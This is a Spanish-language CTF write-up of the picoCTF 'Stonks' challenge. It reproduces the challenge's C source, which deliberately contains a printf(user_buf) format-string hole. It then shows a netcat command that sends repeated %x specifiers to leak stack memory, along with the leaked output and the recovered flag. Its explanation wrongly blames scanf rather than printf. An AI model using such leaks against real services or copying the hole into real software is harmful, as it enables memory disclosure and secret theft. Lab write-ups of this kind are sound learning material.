## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`
## Solución
Vemos que el codigo tiene un scanf, este scanf no formatea la salida, al no formatearla asume que es una cadena.
```bash
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
  
```

Nos conectamos al puerto enviamos %x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x para ver  la memoria en hexadecimal
```bash
┌──(kali㉿kali)-[~/picoCTF/binexp1/stonks]
└─$ (echo "1";echo "%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x") |nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
9203370804b00080489c3f7ee5d80ffffffff19201160f7ef3110f7ee5dc7092021803920335092033706f6369707b465443306c5f49345F74356d5f6c6c306d5f795f79336e32666331
Portfolio as of Mon Nov 11 17:02:54 UTC 2024


3 shares of GGF
3 shares of KQCM
7 shares of JO
72 shares of RN
Goodbye!
                                                                                 
┌──(kali㉿kali)-[~/picoCTF/binexp1/stonks]
└─$ (echo "1";echo "%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x") |nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
8d06450804b00080489c3f7f2bd80ffffffff18D04160f7f39110f7f2bdc708d0518018d064308d064506f6369707b465443306c5f49345F74356d5f6c6c306d5f795f79336e3266633130613130ffcc007df7f66af8f7f3944095a7140010f7dc8ce9f7f3a0c0f7f2b5c0f7f2b000ffcc8e08f7db968df7f2b5c08048ecaffcc8e140F7F4DF09804b000f7f2b000f7f2be20ffcc8e48
Portfolio as of Mon Nov 11 17:03:21 UTC 2024


1 shares of CEAQ
4 shares of AKNN
14 shares of UUNW
1 shares of RJBS
23 shares of CXZ
49 shares of G
43 shares of H
98 shares of LAD
53 shares of REE
22 shares of AZ
261 shares of HWA
Goodbye!


```

Quitamos caracteres en cyberchef.

![[Pasted image 20241111110423.png]]

`picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}`
## Notas Adicionales

## Referencias
